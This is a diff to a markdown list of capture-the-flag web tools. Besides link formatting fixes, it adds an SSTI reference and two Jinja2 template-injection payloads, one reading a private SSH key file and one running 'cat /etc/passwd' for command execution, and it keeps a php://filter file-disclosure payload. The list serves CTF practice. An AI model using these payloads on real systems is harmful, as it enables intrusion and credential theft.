@@ -39,10 +39,13 @@ _Tools used for solving Web challenges_
 - [Hackbar](https://addons.mozilla.org/en-US/firefox/addon/hackbartool/)  - Firefox addon for easy web exploitation.
 - [Postman](https://chrome.google.com/webstore/detail/postman/fhbjgbiflinjbdggehcddcbncdddomop?hl=en)  - Add on for chrome for debugging network requests.
 - [Raccoon](https://github.com/evyatarmeged/Raccoon)  - A high performance offensive security tool for reconnaissance and vulnerability scanning.
--  [W3af](https://github.com/andresriancho/w3af)  - Web Application Attack and Audit Framework.
--  [XSSer](http://xsser.sourceforge.net/)  - Automated XSS testor.
--  [OWASP ZAP](https://www.owasp.org/index.php/Projects/OWASP_Zed_Attack_Proxy_Project)  - Intercepting proxy to replay, debug, and fuzz HTTP requests and responses.
--  [php filter] - err=php://filter/convert.base64-encode/resource=index.php
+- [W3af](https://github.com/andresriancho/w3af)  - Web Application Attack and Audit Framework.
+- [XSSer](http://xsser.sourceforge.net/)  - Automated XSS testor.
+- [OWASP ZAP](https://www.owasp.org/index.php/Projects/OWASP_Zed_Attack_Proxy_Project)  - Intercepting proxy to replay, debug, and fuzz HTTP requests and responses.
+- [php filter] - err=php://filter/convert.base64-encode/resource=index.php
+- [SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#basic-injection) 	- SSTI Repository
+- - [Read File] {{ ''.__class__.__mro__[2].__subclasses__()[40]()('/home/test/.ssh/id_rsa').read()}}
+- - [RCE] {{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
 
 ### Crypto
 _Tools used for solving Crypto challenges_
